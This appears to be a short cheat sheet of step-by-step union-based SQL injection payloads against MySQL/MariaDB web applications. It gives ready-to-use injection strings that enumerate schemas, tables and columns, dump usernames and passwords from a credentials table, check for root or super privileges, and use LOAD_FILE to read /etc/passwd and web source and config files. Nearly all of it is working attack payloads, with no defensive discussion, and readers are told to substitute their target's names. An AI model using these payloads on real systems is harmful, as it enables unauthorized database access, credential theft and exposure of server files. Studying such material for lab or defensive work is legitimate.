# sql-injection

## Union Base SQL Injection
## Method for dumping data from database using Uninon SQL Injection

##### Schema,Schemata check

      mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

#### Step 1: Schema/Database check

     cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

#### Step 2: Tables check

      cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

Here , dev is database name which will replace to your target database name

#### Step3: Columns check

      cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

Here , credentials is table name whick will replace to your target table name

#### Step4: Dum Data from table:

      cn' UNION select 1, username, password, 4 from dev.credentials-- -

Where username and password are column name , dev is database name , credentials is table name

## Read Data/Sensitive files using Union SQL Injection
     SELECT USER()
     SELECT CURRENT_USER()
     SELECT user from mysql.user

#### Step 1:Privilege Check

      SELECT super_priv FROM mysql.user
      cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
      cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
      cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
#### Step 2:Load File
Now that we know we have enough privileges to read local system files, let us do that using the LOAD_FILE() function. The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the /etc/passwd file:

      SELECT LOAD_FILE('/etc/passwd');
      cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

#### Another Example

We know that the current page is search.php. The default Apache webroot is /var/www/html. Let us try reading the source code of the file at /var/www/html/search.php.

      cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
      cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
